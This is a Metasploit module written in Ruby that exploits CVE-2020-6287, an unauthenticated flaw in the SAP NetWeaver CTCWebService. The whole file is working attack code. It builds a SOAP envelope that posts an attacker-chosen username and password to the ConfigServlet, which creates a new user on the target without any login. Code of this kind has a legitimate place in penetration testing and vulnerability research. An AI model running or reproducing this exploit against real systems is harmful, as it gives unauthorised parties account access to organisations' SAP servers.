##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'SAP Unauthenticated WebService User Creation',
      'Description'     => %q{
      },
      'Author'          => [
        'Pablo Artuso',
        'Dmitry Chastuhin',
        'Spencer McIntyre'
      ],
      'License'         => MSF_LICENSE,
      'References'      => [
        [ 'CVE', '2020-6287' ],
        [ 'URL', 'https://github.com/chipik/SAP_RECON' ],
        [ 'URL', 'https://www.onapsis.com/recon-sap-cyber-security-vulnerability' ],
      ],
      'Notes' => {
          'AKA' => [ 'RECON' ]
      },
      'DisclosureDate' => '2020-07-14'
    ))

    register_options(
      [
        Opt::RPORT(50000),
        OptString.new('USERNAME',  [ true, 'The username to create' ]),
        OptString.new('PASSWORD', [ true, 'The password for the new user' ]),
        OptString.new('TARGETURI', [ true, 'Path to ConfigServlet', '/CTCWebService/CTCWebServiceBean'])
      ])
  end

  def run
    uri = normalize_uri(target_uri.path, 'ConfigServlet')

    res = send_request_cgi(
      {
        'uri' => uri,
        'method' => 'POST',
        'ctype' => 'text/xml;charset=UTF-8',
        'data' => soap_create_user
      })
    unless res&.code == 200
      print_error("#{rhost}:#{rport} - Exploit failed")
    end
  end

  def soap_create_user
    message_data =  '<root>'
    message_data << '  <user>'
    message_data << '    <JavaOrABAP>java</JavaOrABAP>'
    message_data << "    <username>#{datastore['USERNAME'].encode(xml: :text)}</username>"
    message_data << "    <password>#{datastore['PASSWORD'].encode(xml: :text)}</password>"
    message_data << '    <userType></userType>'
    message_data << '  </user>'
    message_data << '</root>'
    message = {
      data: message_data,
      name: 'userDetails'
    }

    envelope =  '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">'
    envelope << '  <soapenv:Header/>'
    envelope << '  <soapenv:Body>'
    envelope << '    <urn:executeSynchronious>'
    envelope << '        <identifier>'
    envelope << '          <component>sap.com/tc~lm~config~content</component>'
    envelope << '          <path>content/Netweaver/ASJava/NWA/SPC/SPC_UserManagement.cproc</path>'
    envelope << '       </identifier>'
    envelope << '       <contextMessages>'
    envelope << "          <baData>#{ Rex::Text.encode_base64(message[:data]) }</baData>"
    envelope << "          <name>#{ message[:name] }</name>"
    envelope << '       </contextMessages>'
    envelope << '    </urn:executeSynchronious>'
    envelope << '   </soapenv:Body>'
    envelope << '</soapenv:Envelope>'
  end
end
